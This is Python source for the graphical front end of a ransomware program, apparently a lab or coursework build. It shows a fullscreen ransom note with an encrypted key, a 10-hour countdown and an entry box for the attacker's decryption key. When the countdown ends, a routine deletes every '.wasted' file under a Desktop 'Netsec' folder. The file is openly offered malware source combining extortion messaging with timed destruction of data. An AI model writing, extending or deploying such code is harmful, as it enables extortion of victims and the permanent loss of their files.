from tkinter import Tk, Frame, Label, Button, StringVar, Text, messagebox, Entry

import threading
import time
import os
import platform
from maindecrypt import decrypt
import discover  # Make sure this exists in your project

class mainwindow(Tk):
    def __init__(self, encrypted_key_b64):
        super().__init__()

        # Fullscreen GUI
        self.attributes("-fullscreen", True)
        self.configure(background='black')

        # Safety exit keys
        self.bind("<Escape>", lambda e: self.destroy())
        self.bind("<Control-Alt-q>", lambda e: self.destroy())

        self.encrypted_key_b64 = encrypted_key_b64

        # Content frame
        main_frame = Frame(self, background='black')
        main_frame.place(relx=0.5, rely=0.5, anchor='center')

        # Main ransom message
        message = f'''[COMPANY_NAME]
YOUR NETWORK IS ENCRYPTED NOW
USE - TO GET THE PRICE FOR YOUR DATA
DO NOT GIVE THIS EMAIL TO 3RD PARTIES
DO NOT RENAME OR MOVE THE FILE
THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY
[begin_key]
{self.encrypted_key_b64}
[end_key]
KEEP IT
'''
        Label(main_frame, text=message, wraplength=800, font='Helvetica 14 bold',
              foreground='white', background='red', justify='left', padx=20, pady=20).pack(pady=(0, 20))

        # Countdown timer
        Label(main_frame, text='TIME LEFT:', font='Helvetica 20 bold',
              foreground='red', background='black').pack()

        self.time_left_var = StringVar(value="599:59")
        Label(main_frame, textvariable=self.time_left_var, font='Helvetica 36 bold',
              foreground='red', background='black').pack(pady=(0, 20))

        # "Pay Money" button
        Label(self, text="Enter the decryption key sent by attacker:", 
      font='Helvetica 14', fg='white', bg='black').pack(pady=(20, 5))

        key_var = StringVar()
        Entry(self, textvariable=key_var, font='Helvetica 14', width=70).pack(pady=5)

        def manual_decrypt():
            key = key_var.get().strip()
            if not key:
                messagebox.showerror("Missing Key", "Please enter a decryption key.")
                return
            try:
                decrypt(key)
                messagebox.showinfo("Success", "Files decrypted successfully.")
                self.destroy()
            except Exception as e:
                messagebox.showerror("Decryption Failed", f"Error: {e}")

        Button(self, text="Unlock Files", command=manual_decrypt, font='Helvetica 14', padx=20, pady=5).pack(pady=20)


        # Start countdown
        threading.Thread(target=self.start_timer, daemon=True).start()

    
    def start_timer(self):
        s = 600 * 60  # 10 hours
        while s!=-1:
            mins, secs = divmod(s, 60)
            self.time_left_var.set(f"{mins:02d}:{secs:02d}")
            time.sleep(1)
            s -= 1

        print("[*] Time expired! Destroying encrypted files...")
        self.destroy_files()

    def destroy_files(self):
        # Delete encrypted files
        if platform.system() in ["Linux", "Darwin"]:
            startdirs = [os.environ['HOME'] + '/Desktop/Netsec']
        else:
            startdirs = [os.environ['USERPROFILE'] + '\\Desktop\\Netsec']

        extension = ".wasted"
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                if file.endswith(extension):
                    try:
                        os.remove(file)
                        print(f"[DELETED] {file}")
                    except Exception as e:
                        print(f"[ERROR] Could not delete {file}: {e}")

	
	# Display final message in a simple popup
        messagebox.showinfo("Time's Up", "Your time is up. Your files have been destroyed.")
        # Then close the GUI
        self.destroy()
       
        

        


# Run the GUI
if __name__ == "__main__":
    encrypted_key = "YourEncryptedKeyHere"  # Replace with actual key
    app = mainwindow(encrypted_key)
    app.mainloop()

